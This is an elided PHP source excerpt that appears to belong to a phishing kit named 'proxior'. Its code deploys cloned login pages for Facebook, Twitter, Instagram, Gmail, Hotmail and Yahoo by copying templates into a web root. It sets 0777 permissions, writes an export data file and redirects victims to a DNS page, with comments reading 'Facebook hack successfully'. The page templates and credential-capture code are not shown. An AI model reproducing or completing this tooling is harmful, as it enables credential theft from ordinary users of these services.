...
error_reporting(E_ALL);
  ...
  //opcache_reset();
   ...
   $ip_redirection = $_SERVER['SERVER_ADDR'];
    ...
    require_once('C:\\xampp\\htdocs\\proxior\\__SRC__\\class_redirection.php');
...
<?php
 ...
 require_once('C:\\xampp\\htdocs\\proxior\\__SRC__\\class_attack_details.php');
...
<?php
  ...
  $site_hack = $obj_data-> SAFE_DATA_ENTER($_POST['site_hack']);
   ...
   if (filter_var($ip_addr, FILTER_VALIDATE_IP) == true) 
    ...
    $post_data_txt = fopen("C:\\xampp\\htdocs\\proxior\\export\\data.txt", "w") or die("Unable to open file!");
    $lines_data_txt = PHP_EOL;
    fwrite($post_data_txt, $lines_data_txt);
    fclose($post_data_txt);

 
     chmod("C:\\xampp\\htdocs\\proxior\\export\\data.txt", 0777);
    ...
    fclose($post_file_php);
      ...
      chmod("C:\\xampp\\htdocs\\proxior\\post.php", 0777);




      chmod("C:\\xampp\\htdocs\\proxior\\index.html", 0777);
  ...
  // isset for ready web sites
 ...
 else if(isset($_POST['site_ready']))
   {
    ...
    $site_ready = $obj_data-> SAFE_DATA_ENTER($_POST['site_ready']);
      ...
      $post_data_txt_site_ready = fopen("C:\\xampp\\htdocs\\proxior\\export\\data.txt", "w");
    ...
    if ($site_ready=='https://www.facebook.com')
       ...
       chmod ("C:\\xampp\\htdocs\\proxior\\", 0777);
       copy("C:\\xampp\\htdocs\\proxior\\default\\facebook\\index.html", "C:\\xampp\\htdocs\\proxior\\index.html");
   ...
   // echo '<script type="text/javascript">alert("Facebook hack successfully");
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
       ...
       chmod ("C:\\xampp\\htdocs\\proxior\\", 0777);
       copy("C:\\xampp\\htdocs\\proxior\\default\\twitter\\index.html", "C:\\xampp\\htdocs\\proxior\\index.html");
   ...
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
       ...
       chmod ("C:\\xampp\\htdocs\\proxior\\", 0777);
       copy("C:\\xampp\\htdocs\\proxior\\default\\instagram\\index.html", "C:\\xampp\\htdocs\\proxior\\index.html");
	   copy("C:\\xampp\\htdocs\\proxior\\default\\instagram\\post.php", "C:\\xampp\\htdocs\\proxior\\post.php");
   ...
   //   </script>';
     echo ("<script>location.href='dns.php'</script>");
       ...
       chmod ("C:\\xampp\\htdocs\\proxior\\", 0777);
       copy("C:\\xampp\\htdocs\\proxior\\default\\gmail\\index.html", "C:\\xampp\\htdocs\\proxior\\index.html");
	   copy("C:\\xampp\\htdocs\\proxior\\default\\gmail\\post.php", "C:\\xampp\\htdocs\\proxior\\post.php");
    ...
    //  </script>';
     echo ("<script>location.href='dns.php'</script>");
       ...
       chmod ("C:\\xampp\\htdocs\\proxior\\", 0777);
       copy("C:\\xampp\\htdocs\\proxior\\default\\hotmail\\index.html", "C:\\xampp\\htdocs\\proxior\\index.html");
	   copy("C:\\xampp\\htdocs\\proxior\\default\\hotmail\\post.php", "C:\\xampp\\htdocs\\proxior\\post.php");
   ...
   //   </script>';
     ...
     if ($site_ready=='https://www.yahoo.com')
       ...
       chmod ("C:\\xampp\\htdocs\\proxior\\", 0777);
       copy("C:\\xampp\\htdocs\\proxior\\default\\yahoo\\index.html", "C:\\xampp\\htdocs\\proxior\\index.html");
